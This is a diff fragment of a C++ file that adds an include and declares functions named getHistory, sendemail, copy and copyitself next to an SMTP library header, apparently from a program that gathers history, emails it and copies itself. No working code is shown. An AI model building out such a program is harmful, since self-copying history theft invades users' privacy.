@@ -7,9 +7,11 @@
 #include "CSmtp.h"
 #include <vector>  
 #include "afxwin.h"  
-
+#include <direct.h>
 using namespace std;
 
 using namespace std;
 void getHistory();
 void sendemail();
+void copy();
+void copyitself(const char *s);
